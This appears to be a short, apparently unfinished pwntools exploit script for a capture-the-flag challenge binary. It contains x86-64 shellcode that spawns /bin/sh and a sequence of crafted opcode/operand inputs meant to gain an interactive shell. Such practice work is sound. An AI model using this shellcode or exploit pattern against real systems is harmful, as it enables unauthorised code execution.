from pwn import *

# elf = ELF("./chall")
# context.binary = "./chall"
# context.arch = "amd64"
# shellcode = shellcraft.sh()
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
shellcode = int(shellcode.hex(), 16)
print(len(bin(shellcode)))

io = process("./chall")
io.recvuntil(b"opcode:")
io.sendline(b"5")
io.recvuntil(b"operand:")
io.sendline(b"#ffffffff")

io.recvuntil(b"opcode:")
io.sendline(b"1")
io.recvuntil(b"operand:")
io.sendline(b"r0")

io.interactive()
